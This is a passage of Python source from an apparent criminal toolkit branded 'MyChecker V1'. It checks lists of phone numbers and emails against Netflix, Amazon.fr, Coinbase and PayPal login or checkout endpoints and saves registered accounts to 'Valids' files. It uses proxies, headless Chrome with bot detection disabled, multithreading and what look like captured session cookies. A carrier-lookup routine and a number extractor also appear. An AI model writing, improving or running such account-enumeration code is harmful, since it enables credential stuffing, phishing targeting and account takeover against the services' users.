            file_contentsd = d.read()
            port = (file_contentsd)
            e = open('results/NetflixNumlist/pays.txt', 'r')
            file_contentsd = e.read()
            pays = (file_contentsd)
        aatt = {
            'proxy': {
                'https': f'https://{username}:{password}@{endpoint}:{port}',
            }
        }
        options = webdriver.ChromeOptions()
        options.add_argument('headless')
        options.add_argument("disable-gpu")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-user-media-security=true")
        options.add_argument("--use-fake-ui-for-media-stream")
        options.add_argument("--disable-popup-blocking")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        clear()
        NetflixNum.banner()
        driver = webdriver.Chrome(service=driver_service, seleniumwire_options=aatt, options=options,)
        driver.get("https://www.netflix.com/login")
        for line in nums:
            try:  
                ctypes.windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Netflix NumList Checker {NetflixNum.checked}/{NetflixNum.loaded} - {NetflixNum.valid} Valids - {NetflixNum.invalid} Invalids")
                NetflixNum.loaded = len(nums)
                numlist = line  
                Pass = 'JKkjsjfsfhj234243$'
                time.sleep(1)
                hq = driver.find_element("xpath",'//*[@id="id_userLoginId"]') 
                hq.clear()
                hq.send_keys(numlist)
                contrycode = driver.find_element("xpath","//*[@id='appMountPoint']/div/div[3]/div/div/div[1]/form/div[1]/div/div/div")
                contrycode.click()
                frcontry = driver.find_element("xpath",f"//a[@id='{pays}']/span[2]")
                frcontry.click()
                proute = driver.find_element("xpath",'//*[@id="id_password"]') 
                proute.send_keys(Pass)
                pr1oute = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
                pr1oute.click()
                time.sleep(1)
                response = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]') 
                if response.text=='Incorrect password. Please try again or you can reset your password.' or response.text=='Mot de passe incorrect. Veuillez réessayer ou réinitialiser votre mot de passe.':
                    print(f"{Fore.LIGHTGREEN_EX} [+] {numlist}")
                    open(f"results/NetflixNumlist-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
                    NetflixNum.valid += 1
                    NetflixNum.checked += 1
                elif response.text=='Please try again in a few minutes.' or response.text=='Veuillez réessayer dans quelques minutes.':
                    NetflixNum.recheck += 1
                    NetflixNum.checked += 1
                    print(f"{Fore.YELLOW} [RECHECK] {numlist}")
                    open(f"results/NetflixNumlist-{time1}/Recheck.txt", "a+", encoding='utf-8', errors='ignore').write(f"{numlist}\n")  
                    time.sleep(5)
                    driver.close()
                    driver = webdriver.Chrome(ChromeDriverManager().install(), service=driver_service, options=options,)
                    driver.get("https://www.netflix.com/login")
                    time.sleep(1)
                else:
                    print(f"{Fore.LIGHTRED_EX} [-] {numlist}")
                    open(f"results/NetflixNumlist-{time1}/Invalids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{numlist}\n")
                    NetflixNum.invalid += 1
                    NetflixNum.checked += 1
            except Exception as e:
                    NetflixNum.recheck += 1
                    NetflixNum.checked += 1
                    print(f"{Fore.YELLOW} [RECHECK] {numlist}")
                    open(f"results/NetflixNumlist-{time1}/Recheck.txt", "a+", encoding='utf-8', errors='ignore').write(f"{numlist}\n")  
                    time.sleep(5)
                    driver.close()
                    driver = webdriver.Chrome(ChromeDriverManager().install(), service=driver_service, options=options,)
                    driver.get("https://www.netflix.com/login")
                    time.sleep(1)

class AmazonMail:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    maillist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
 $$$$$$\  $$\      $$\  $$$$$$\  $$$$$$$$\  $$$$$$\  $$\   $$\ 
$$  __$$\ $$$\    $$$ |$$  __$$\ \____$$  |$$  __$$\ $$$\  $$ |
$$ /  $$ |$$$$\  $$$$ |$$ /  $$ |    $$  / $$ /  $$ |$$$$\ $$ |
$$$$$$$$ |$$\$$\$$ $$ |$$$$$$$$ |   $$  /  $$ |  $$ |$$ $$\$$ |
$$  __$$ |$$ \$$$  $$ |$$  __$$ |  $$  /   $$ |  $$ |$$ \$$$$ |
$$ |  $$ |$$ |\$  /$$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |\$$$ |
$$ |  $$ |$$ | \_/ $$ |$$ |  $$ |$$$$$$$$\  $$$$$$  |$$ | \$$ |
\__|  \__|\__|     \__|\__|  \__|\________| \______/ \__|  \__|                                                                                         
\n"""))

        faded_text = fade.fire(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.YELLOW+"~"+Fore.RESET) + "\n")

    def console_title():
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Amazon Maillist Checker {AmazonMail.checked}/{AmazonMail.loaded} - {AmazonMail.valid} Valids - {AmazonMail.invalid} Invalids - {AmazonMail.cpm} CPM")

    def cpm_counter():
        while True:
            now = AmazonMail.checked
            sleep(1)
            AmazonMail.cpm = (AmazonMail.checked - now) * 60

    def AmazonMail(maillist):
        data = {'appActionToken': 'Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D',
        'appAction': 'SIGNIN_PWD_COLLECT',
        'subPageType': 'SignInClaimCollect',
        'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=',
        'prevRID': 'ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=',
        'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA',
        'email': maillist,
        'password': '',
        'create': '0',
        'metadata1': 'ECdITeCs:'
        }
        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "fr,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-length": "9702",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes',
        "downlink": "10",
        "ect": "4g",
        "origin": "https://www.amazon.fr",
        "referer": "https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
        "rtt": "150",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
        }


        try:
            req = post(f"https://www.amazon.fr/ap/signin", data=data, headers=headers, timeout=10).text
            if req.__contains__("Impossible de trouver un compte"):
                AmazonMail.invalid += 1
                AmazonMail.checked += 1
                print(f"{Fore.LIGHTRED_EX} [-] {maillist}")
                open(f"results/AmazonMail-{time1}/Invalids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
            elif req.__contains__("Mot de passe oublié"):
                AmazonMail.valid += 1
                AmazonMail.checked += 1
                print(f"{Fore.LIGHTGREEN_EX} [+] {maillist}")
                open(f"results/AmazonMail-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
            else:
                AmazonMail.recheck += 1
                AmazonMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {maillist}")
                open(f"results/AmazonMail-{time1}/Rechecks.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
        except:
                AmazonMail.recheck += 1
                AmazonMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {maillist}")
                open(f"results/Operateur-Checker-{time1}/Recheck.txt", "a+", encoding='utf-8', errors='ignore').write(f"{maillist}\n")

    def start():
        try:
            AmazonMail.banner()
            print(f" \n[{Fore.YELLOW}#{Fore.WHITE}]  Please import your Maillist...")
            maillist = open(fileopenbox(title="Select your Maillist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            AmazonMail.loaded = len(maillist)
            try:

                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                AmazonMail.start()
            Thread(target=AmazonMail.console_title, daemon=False).start()
            Thread(target=AmazonMail.cpm_counter, daemon=False).start()
            if not path.exists("results"):
                mkdir("results")
            if not path.exists(f"results/AmazonMail-{time1}"):
                mkdir(f"results/AmazonMail-{time1}")
            if not path.exists(f"results/AmazonMail-{time1}/Capture"):
                mkdir(f"results/AmazonMail-{time1}/Capture")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(AmazonMail.AmazonMail, maillist)
            mainpool.close()
            mainpool.join()
            if AmazonMail.checked == AmazonMail.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e


class CoinbaseMail:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    maillist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
 $$$$$$\   $$$$$$\  $$$$$$\ $$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  _____|
$$ /  \__|$$ /  $$ |  $$ |  $$$$\ $$ |$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |      
$$ |      $$ |  $$ |  $$ |  $$ $$\$$ |$$$$$$$\ |$$$$$$$$ |\$$$$$$\  $$$$$\    
$$ |      $$ |  $$ |  $$ |  $$ \$$$$ |$$  __$$\ $$  __$$ | \____$$\ $$  __|   
$$ |  $$\ $$ |  $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |  $$ |$$\   $$ |$$ |      
\$$$$$$  | $$$$$$  |$$$$$$\ $$ | \$$ |$$$$$$$  |$$ |  $$ |\$$$$$$  |$$$$$$$$\ 
 \______/  \______/ \______|\__|  \__|\_______/ \__|  \__| \______/ \________|                                                                                     
\n"""))
        faded_text = fade.water(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET) + "\n")

    def console_title():
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Coinbase Maillist Checker {CoinbaseMail.checked}/{CoinbaseMail.loaded} - {CoinbaseMail.valid} Valids - {CoinbaseMail.invalid} Invalids - {CoinbaseMail.cpm} CPM")

    def cpm_counter():
        while True:
            now = CoinbaseMail.checked
            sleep(1)
            CoinbaseMail.cpm = (CoinbaseMail.checked - now) * 60


    def CoinbaseMail(maillist):
        data = {'username': maillist,
        'password': 'n'
        }
        headers = {"host": "www.coinbase.com",
        "user-Agent": "Coinbase/9.26.4 (com.vilcsak.bitcoin2; build:92604; iOS 14.6)",
        "x-cb-platform": "ios",
        "x-os-name": "ios",
        "x-device-model": "iPhone 6s",
        "x-device-manufacturer": "Apple",
        "cb-client": 'com.vilcsak.bitcoin2/9.26.4/92604',
        "x-cb-session-uuid": "a6daf860-c16b-448f-95dd-ede0d5359ca2",
        "cb-version": "2021-01-11",
        "x-os-version": "14.6",
        "x-device-product": "unknown",
        "x-app-build-number": "92604",
        "x-react-native": "true",
        "content-length": "54",
        "x-app-version": "9.26.4",
        "connection": "keep-alive",
        "accept-language": "fr",
        "accept": "*/*",
        "content-type": "application/json",
        "x-timezone-offset": "7200",
        "x-device-brand": "Apple",
        "x-cb-pagekey": "sign_in_credentials",
        "accept-encoding": "gzip, deflate, br"
        }

        try:
            req = requests.get(f"https://www.coinbase.com/oauth/authorize/with-credentials?client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&scope=all", data=data, headers=headers, timeout=10).text
            if req.__contains__("error"):
                CoinbaseMail.invalid += 1
                CoinbaseMail.checked += 1
                print(f"{Fore.LIGHTRED_EX} [-] {maillist}")
                open(f"results/CoinbaseMail-{time1}/Invalids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
            elif req.__contains__("sms"):
                CoinbaseMail.valid += 1
                CoinbaseMail.checked += 1
                print(f"{Fore.LIGHTGREEN_EX} [+] {maillist}")
                open(f"results/CoinbaseMail-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
            else:
                CoinbaseMail.recheck += 1
                CoinbaseMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {maillist}")
                open(f"results/CoinbaseMail-{time1}/Rechecks.txt", "a+", encoding="utf-8", errors="ignore").write(f"{maillist}\n")
        except:
                CoinbaseMail.recheck += 1
                CoinbaseMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {maillist}")
                open(f"results/Operateur-Checker-{time1}/Recheck.txt", "a+", encoding='utf-8', errors='ignore').write(f"{maillist}\n")

    def start():
        try:
            CoinbaseMail.banner()
            print(f" \n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}]  Please import your Maillist...")
            maillist = open(fileopenbox(title="Select your Maillist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            CoinbaseMail.loaded = len(maillist)
            try:

                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                CoinbaseMail.start()
            Thread(target=CoinbaseMail.console_title, daemon=False).start()
            Thread(target=CoinbaseMail.cpm_counter, daemon=False).start()
            if not path.exists("results"):
                mkdir("results")
            if not path.exists(f"results/CoinbaseMail-{time1}"):
                mkdir(f"results/CoinbaseMail-{time1}")
            if not path.exists(f"results/CoinbaseMail-{time1}/Capture"):
                mkdir(f"results/CoinbaseMail-{time1}/Capture")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(CoinbaseMail.CoinbaseMail, maillist)
            mainpool.close()
            mainpool.join()
            if CoinbaseMail.checked == CoinbaseMail.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e

class PaypalMail:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    liss = []


    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
$$$$$$$\   $$$$$$\ $$\     $$\ $$$$$$$\   $$$$$$\  $$\       
$$  __$$\ $$  __$$\\$$\   $$  |$$  __$$\ $$  __$$\ $$ |      
$$ |  $$ |$$ /  $$ |\$$\ $$  / $$ |  $$ |$$ /  $$ |$$ |      
$$$$$$$  |$$$$$$$$ | \$$$$  /  $$$$$$$  |$$$$$$$$ |$$ |      
$$  ____/ $$  __$$ |  \$$  /   $$  ____/ $$  __$$ |$$ |      
$$ |      $$ |  $$ |   $$ |    $$ |      $$ |  $$ |$$ |      
$$ |      $$ |  $$ |   $$ |    $$ |      $$ |  $$ |$$$$$$$$\ 
\__|      \__|  \__|   \__|    \__|      \__|  \__|\________|                                                                                          
\n"""))
        faded_text = fade.water(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET) + "\n")

    def consoletitle():
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Paypal Maillist Checker {PaypalMail.checked}/{PaypalMail.loaded} - {PaypalMail.valid} Valids - {PaypalMail.invalid} Invalids - {PaypalMail.cpm} CPM")

    def cpm_counter():
        while True:
            now = PaypalMail.checked
            sleep(1)
            PaypalMail.cpm = (PaypalMail.checked - now) * 60

    def checker(email):
        try:
            url = 'https://history.paypal.com/cgi-bin/'
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {'cmd':' _cart ',
             'upload':' 1 ',
             'business':' indre@robertkalinkin.com ',
             'item_name_1':'RK GIFT BOX/1',
             'item_number_1':'',
             'amount_1':' 81.82',
             'quantity_1':' 1',
             'weight_1':' 0',
             'on0_1':' Size - letters',
             'os0_1':' S',
             'on1_1':' Color',
             'os1_1':' GRY/WH/WH',
             'item_name_2':' Shipping, Handling, Discounts & Taxes',
             'item_number_2':' ',
             'amount_2':' 17.18',
             'quantity_2':' 1',
             'weight_2':' 0',
             'currency_code':' EUR',
             'first_name':' James Warner',
             'last_name':' ',
             'address1':' 3881 Yorkland Dr. NW Apt. 8',
             'address2':' ',
             'city':' Comstock Park',
             'zip':' 49321',
             'country':' US',
             'address_override':' 0',
             'email':email}
            req = post(url, data=data, headers=headers, timeout=10).text          
            if req.__contains__(email):
                PaypalMail.valid += 1
                PaypalMail.checked += 1
                print(f"{Fore.LIGHTGREEN_EX} [+] {email}")
                open(f"results/PaypalMail-{time1}/Valids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")
            elif req.__contains__('your last action could not be completed'):
                PaypalMail.recheck += 1
                PaypalMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {email}")
                open(f"results/PaypalMail-{time1}/Rechecks.txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")
            else:
                PaypalMail.invalid += 1
                PaypalMail.checked += 1
                print(f"{Fore.LIGHTRED_EX} [-] {email}")
                open(f"results/PaypalMail-{time1}/Invalids.txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")
        except:
                PaypalMail.recheck += 1
                PaypalMail.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {email}")
                open(f"results/PaypalMail-{time1}/Rechecks.txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")

    def start():
            PaypalMail.banner()
            print(f" \n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}]  Please import your Maillist...")
            email = open(fileopenbox(title="Select your Maillist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            PaypalMail.loaded = len(email)
            try:
                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                PaypalMail.start()
            Thread(target=PaypalMail.consoletitle, daemon=False).start()
            Thread(target=PaypalMail.cpm_counter, daemon=False).start()
            if not path.exists("results"):
                mkdir("results")
            if not path.exists(time1):
                mkdir(f"results/PaypalMail-{time1}")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(PaypalMail.checker, email)
            mainpool.close()
            mainpool.join()
            if PaypalMail.checked == PaypalMail.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()

class OperatorChecker:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    numlist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
 $$$$$$\  $$$$$$$\  $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\  $$$$$$\  $$$$$$$\  
$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$  __$$\ 
$$ /  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ /  $$ |  $$ |   $$ /  $$ |$$ |  $$ |
$$ |  $$ |$$$$$$$  |$$$$$\    $$$$$$$  |$$$$$$$$ |  $$ |   $$ |  $$ |$$$$$$$  |
$$ |  $$ |$$  ____/ $$  __|   $$  __$$< $$  __$$ |  $$ |   $$ |  $$ |$$  __$$< 
$$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |  $$ |
 $$$$$$  |$$ |      $$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |    $$$$$$  |$$ |  $$ |
 \______/ \__|      \________|\__|  \__|\__|  \__|  \__|    \______/ \__|  \__|                                                                                                                                                                               
"""))
        faded_text = fade.brazil(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.GREEN+"~"+Fore.RESET))

    def console_title():
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Operator Checker {OperatorChecker.checked}/{OperatorChecker.loaded} - {OperatorChecker.valid} Valids - {OperatorChecker.invalid} Invalids - {OperatorChecker.cpm} CPM")

    def cpm_counter():
        while True:
            now = OperatorChecker.checked
            sleep(1)
            OperatorChecker.cpm = (OperatorChecker.checked - now) * 60


    def OperatorChecker(numlist):
        try:
            r = requests.get(f"https://messente.com/messente-api/number-lookup/?phone_number=%2B{numlist}").text
            if r.__contains__("error"):
                OperatorChecker.invalid += 1
                OperatorChecker.checked += 1
                print(Fore.RED+f"Mauvais num : {numlist}")
            elif r.__contains__("e*Message"):
                OperatorChecker.valid += 1
                OperatorChecker.checked += 1
                req = requests.get(f"https://messente.com/messente-api/number-lookup/?phone_number=%2B{numlist}").json()
                cap = print(f"{Fore.GREEN} [+] {numlist} {Fore.WHITE} | Country: {req['countryName']} | Operateur: {req['originalCarrierName']} | TimeZone: {req['timeZone']}")
                open(f"results/Operateur/eMessage-{time1}.txt", "a+").write(f"{n}\n")
            elif not r.__contains__('originalCarrierName":""'):
                OperatorChecker.valid += 1
                OperatorChecker.checked += 1
                req = requests.get(f"https://messente.com/messente-api/number-lookup/?phone_number=%2B{numlist}").json()
                cap = print(f"{Fore.GREEN} [+] {numlist} {Fore.WHITE} | Country: {req['countryName']} | Operateur: {req['originalCarrierName']} | TimeZone: {req['timeZone']}")
                open(f"results/Operateur/{req['originalCarrierName']}-{time1}.txt", "a+").write(f"{numlist}\n")
            else:
                OperatorChecker.invalid += 1
                OperatorChecker.checked += 1
                print(f"{Fore.RED} [-] {numlist}")
        except:
                OperatorChecker.recheck += 1
                OperatorChecker.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {numlist}")

    def start():
        try:
            OperatorChecker.banner()
            print(f"\n\n[{Fore.GREEN}#{Fore.WHITE}] Please import your Numberlist...")
            numlist = open(fileopenbox(title="Select your Numberlist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            OperatorChecker.loaded = len(numlist)
            try:
                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                OperatorChecker.start()
            Thread(target=OperatorChecker.console_title, daemon=False).start()
            Thread(target=OperatorChecker.cpm_counter, daemon=False).start()
            if not path.exists("results"):
                mkdir("results")
            if not path.exists(f"results/Operateur"):
                mkdir(f"results/Operateur")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(OperatorChecker.OperatorChecker, numlist)
            mainpool.close()
            mainpool.join()
            if OperatorChecker.checked == OperatorChecker.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e

class Extractor:
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    timeout = 0
    numlist = []

    def CENTER(var:str, space:int=None): 
        if not space:space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2        
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def banner():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
$$$$$$$$\ $$\   $$\ $$$$$$$$\ $$$$$$$\   $$$$$$\   $$$$$$\ $$$$$$$$\  $$$$$$\  $$$$$$$\  
$$  _____|$$ |  $$ |\__$$  __|$$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$  __$$\ 
$$ |      \$$\ $$  |   $$ |   $$ |  $$ |$$ /  $$ |$$ /  \__|  $$ |   $$ /  $$ |$$ |  $$ |
$$$$$\     \$$$$  /    $$ |   $$$$$$$  |$$$$$$$$ |$$ |        $$ |   $$ |  $$ |$$$$$$$  |
$$  __|    $$  $$<     $$ |   $$  __$$< $$  __$$ |$$ |        $$ |   $$ |  $$ |$$  __$$< 
$$ |      $$  /\$$\    $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$\   $$ |   $$ |  $$ |$$ |  $$ |
$$$$$$$$\ $$ /  $$ |   $$ |   $$ |  $$ |$$ |  $$ |\$$$$$$  |  $$ |    $$$$$$  |$$ |  $$ |
\________|\__|  \__|   \__|   \__|  \__|\__|  \__| \______/   \__|    \______/ \__|  \__|                                                                                                                                                                                                                                                                                                                                                                                                                                                   
\n"""))

        faded_text = fade.pinkred(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))

    def console_title():
        while True:
            windll.kernel32.SetConsoleTitleW(f"Spliter {Extractor.checked}/{Extractor.loaded} - {Extractor.valid} Valids - {Extractor.invalid} Invalids - {Extractor.cpm} CPM")

    def cpm_counter():
        while True:
            now = Extractor.checked
            sleep(1)
            Extractor.cpm = (Extractor.checked - now) * 60


    def Extractor(numlist):
        try:

            nummm = numlist[0:11]
            nummm = nummm.replace(",", "")
            if len(nummm)<11:
                cap = print(f"{Fore.RED} [-] {numlist[0:11]} {Fore.WHITE}")
                Extractor.invalid += 1
                Extractor.checked += 1
            else: 
                Extractor.valid += 1
                Extractor.checked += 1
                cap = print(f"{Fore.GREEN} [+] {numlist[0:11]} {Fore.WHITE}")
                open(f"results/Extractor/Extractor.txt", "a+").write(f"+{numlist[0:11]}\n")
        except:
                Extractor.recheck += 1
                Extractor.checked += 1
                print(f"{Fore.YELLOW} [RECHECK] {numlist}")

    def start():
        try:
            Extractor.banner()
            print(f" \n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}] Please import your Numberlist...")
            numlist = open(fileopenbox(title="Select your Numberlist !", default="*.txt"), "r", encoding="utf8",errors="ignore").read().split('\n')
            Extractor.loaded = len(numlist)
            try:
                threads = int(input("\nThreads : "))
            except:
                print(f"\n{Fore.LIGHTRED_EX}Invalid threads !")
                sleep(3)
                Extractor.start()
